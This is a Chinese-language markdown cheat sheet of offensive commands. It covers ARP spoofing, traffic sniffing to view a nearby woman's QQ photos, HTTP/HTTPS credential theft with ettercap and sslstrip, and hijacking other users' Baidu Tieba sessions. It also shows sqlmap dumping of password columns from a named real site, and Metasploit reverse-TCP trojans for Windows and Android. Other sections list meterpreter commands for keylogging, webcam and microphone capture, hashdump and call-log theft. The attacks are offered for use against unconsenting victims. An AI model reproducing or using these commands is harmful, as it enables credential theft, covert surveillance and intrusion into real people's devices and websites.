<div id="Other.md"></div>

[一、局域网断网攻击](#一)  
[二、获取内网妹子的QQ相册](#二)  
[三、HTTP账号密码获取](#三)  
[四、HTTPS账号密码获取](#四)  
[五、会话劫持-登录别人的百度贴吧](#五)  
[六、会话劫持-一键劫持会话](#六)  
[七、SQLMAP介绍及ASP网站渗透](#七)  
[八、SQLMAP介绍之PHP网站渗透](#八)  
[九、SQLMAP介绍之Cookie注入](#九)  
[十、metasploit新手知识补全](#十)  
[十一、Metasploit之我的远程控制软件](#十一)  
[十二、Metasploit之木马文件操作功能](#十二)  
[十三、Metasploit之木马系统操作功能](#十三)  
[十四、Metasploit之木马的用户操作及摄像头操作](#十四)  
[十五、Metasploit之渗透安卓实战](#十五)  
[十六、Metasploit之服务器蓝屏攻击](#十六)  

==============================


<h5 id="一">一、局域网断网攻击</h5>
arp攻击</br>
命令格式，如下：</br>  
#arpspoof -i 网卡 -t 目标IP 网关</br>

arp攻击原理：</br>
目标的IP流量会经过我的网卡，没有从网关出去（因没有配置IP转发）</br>

看局域网中的IP</br>
#fping -asg 192.168.1.0/24


<h5 id="二">二、获取内网妹子的QQ相册</h5>  
IP流量转发</br>
#echo 1 > /proc/sys/net/ipv4/ip_forward

arp欺骗  
命令格式，如下：  
#arpspoof -i 网卡 -t 目标IP 网关 

arp欺骗原理：</br>
目标的IP流量会经过我的网卡，从网关出去</br>
目标机器上arp -a可以看到网关攻击者的IP

获取本机网卡的图  
#driftnet -i 网卡


<h5 id="三">三、HTTP账号密码获取</h5>
#echo 1 > /proc/sys/net/ipv4/ip_forward</br>
#arpspoof -i eth0 -t 目标IP 网关</br>
#ettercap -Tq -i 网卡</br>
-T启动文本模式</br>
-q安静模式</br>
==>返回结果中，可以看到登录页面，用户名和密码

中文用户名需要URL解码，可以百度解码页面


<h5 id="四">四、HTTPS账号密码获取</h5>
#vi /etc/ettercap/etter.conf</br>
去掉下面的注释</br>
# if you use iptables:</br>
   #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</br>
   #redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

把HTTPS的链接还原为HTTP</br>
#sslstrip -a -f -k

#echo 1 > /proc/sys/net/ipv4/ip_forward</br>
#arpspoof -i eth0 -t 目标IP 网关</br>
#ettercap -Tq -i 网卡

缺点：</br>
容易出现证书错误


<h5 id="五">五、会话劫持-登录别人的百度贴吧</h5>
重新生成抓包后的文件</br>
ferret  </br>
重放流量</br>
hamster</br>
*第一种方法：</br>
#echo 1 > /proc/sys/net/ipv4/ip_forward</br>
#arpspoof -i eth0 -t 目标IP 网关

#wireshark  （等待目标机器浏览网站，wireshark保存抓包文件）</br>
#ferret -r *.cap</br>
#hamster    (根据显示，修改浏览器代理，并在浏览器中访问http://IP：port)

*第二种方法</br>
#echo 1 > /proc/sys/net/ipv4/ip_forward</br>
#arpspoof -i eth0 -t 目标IP 网关</br>
#ferret -i 网卡</br>
#hamster


<h5 id="六">六、会话劫持-一键劫持会话</h5>
#echo 1 > /proc/sys/net/ipv4/ip_forward</br>
#arpspoof -i eth0 -t 目标IP 网关</br>
1）使用CookieCadger-1.08.jar工具</br>
2）选择网卡，启动（等待目标机器操作）


<h5 id="七">七、SQLMAP介绍及ASP网站渗透</h5>
windows下的软件：明小子，啊D，NBSI，御剑

#sqlmap -u 网址</br>
-u：检测是否存在SQL注入，返回数据库名字

#sqlmap -u 网址 --tables</br>
--tables：列出所有表名

#sqlmap -u 网址 --columns -T "表名"</br>
--columns：列出所有列名

#sqlmap -u 网址 --dump -C "列名，列名" -T "表名"</br>
--dump：下载数据（如：列名可写为：username,password）


<h5 id="八">八、SQLMAP介绍之PHP网站渗透</h5>
#sqlmap -u 网址 --is-dba</br>
--is-db：检测是否DBA权限，可以写文件

#sqlmap -u 网址 --dbs</br>
--dbs：列出所有数据库

#sqlmap -u 网址 --current-db</br>
--current-db：查找自己的数据库

#sqlmap -u 网址 --tables -D "数据库名"</br>
#sqlmap -u 网址 --columns -T "表名" -D "数据库名"</br>
#sqlmap -u 网址 --dump -C "列名，列名" -T "表名" -D "数据库名"


<h5 id="九">九、SQLMAP介绍之Cookie注入</h5>
使用cookie中转注入方式</br>
网站为http://www.wisefund.com.cn/about.asp?id=56</br>
#sqlmap -u "http://www.wisefund.com.cn/about.asp" --cookie "id=56" --level 2</br>
--cookie：写id的参数，如果是cookie注入，需要把等级提升为level 2

#sqlmap -u "http://www.wisefund.com.cn/about.asp" --tables "表名"--cookie "id=56" --level 2


<h5 id="十">十、metasploit新手知识补全</h5>
#apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get clean</br>
（使用前更新库）</br>
#apt-get remove metasploit</br>
#apt-get install metasploit

#msfconsole</br>
exploit模块：漏洞利用</br>
payloads：shellcode，漏洞利用后执行的代码

->help      //帮助</br>
->show      //显示所有命令</br>
->clear     //清除</br>
->use exploit/windows/smb/ms08_067_netapi   //漏洞利用模块</br>
->show options  //显示输入参数 </br>
->set RHOST 192.168.1.100</br>
->set payload windows/meterpreter/reverse_tcp       //攻击利用</br>
->set LHOST 192.168.1.101</br>
->exploit       //执行


<h5 id="十一">十一、Metasploit之我的远程控制软件</h5>
木马：控制端---服务端</br>
根据自己的IP（如：19.168.1.103 55555）生成一个木马</br>
#msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=55555 X > test.exe   </br> 
//注：kali2.0 msfpayload和msfencode合并成了msfvenom，如下</br>
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=55555 CMD=test.exe EXITFUNC=thread -f exe -o ./test.exe

#msfconsole</br>
->use exploit/multi/handler     //选择漏洞模块</br>
->set payload windows/meterpreter/reverse_tcp       //选择shellcode</br>
->show options</br>
->set LHOST 192.168.0.103</br>
->set LPORT 55555</br>
->exploit       //等待目标主机双击木马test.exe

-->sysinfo</br>
-->shell


<h5 id="十二">十二、Metasploit之木马文件操作功能</h5>
接着十一节，使用木马</br>
-->help</br>
-->background        //当前会话在后台运行

->sessions -l       //显示会话</br>
->sessions -i 1     //选择进入会话

-->ps       //得到要注入的PID进程</br>
-->migrate 进程ID     //注入进程：木马随时有可能被结束掉</br>

-->run vnc      //查看目标主机远程桌面

-->download 文件名    //下载文件</br>
-->upload 文件名      //上传文件</br>
-->edit 文件名        //编辑文件</br>
-->cat 文件名         //查看文件


<h5 id="十三">十三、Metasploit之木马系统操作功能</h5>

-->arp      //查看arp缓冲表</br>
-->ifconfig</br>
-->getproxy     //获取代理</br>
-->netstat

-->kill     //结束进程</br>
-->ps       //查看进程</br>
-->reg      //注册表</br>
-->shell    //获取shell</br>
-->reboot</br>
-->shutdown</br>
-->sysinfo      //获取电脑信息


<h5 id="十四">十四、Metasploit之木马的用户操作及摄像头操作</h5>

-->enumdesktops        //用户登录数</br>
-->keyscan_dump        //键盘记录-下载</br>
-->keyscan_start       //键盘记录-开始</br>
-->keyscan_stop        键盘记录-结束</br>
-->uictl               //获取键盘鼠标控制权</br>
-->record_mic          //音频录制</br>
（看视频下载安装agt-get install mplayer）</br>
-->webcam_chat         //查看摄像头接口</br>
-->webcam_list         //查看摄像头列表</br>
-->webcam_stream       //摄像头视频获取</br>
-->getsystem           //获取高权限</br>
-->hashdump            //下载hash密文


<h5 id="十五">十五、Metasploit之渗透安卓实战</h5>
根据自己的IP（如：19.168.1.103 55555）生成一个木马</br>
#msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=55555 R > test.apk   </br> 
//注：kali2.0 msfpayload和msfencode合并成了msfvenom，如下</br>
#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=55555 > test.apk

#msfconsole</br>
->use exploit/multi/handler     //选择漏洞模块</br>
->set payload android/meterpreter/reverse_tcp       //选择shellcode</br>
->set LHOST 192.168.0.103</br>
->set LPORT 55555</br>
->exploit

-->search       //如搜索jpg、png、bmp</br>
-->download     //如下载jpg、png、bmp</br>
-->webcam_snmp  //截屏</br>
-->webcam_stream    //摄像头监控</br>
-->check_root   //检测root</br>
-->dump_calllog     //下载电话


<h5 id="十六">十六、Metasploit之服务器蓝屏攻击</h5>



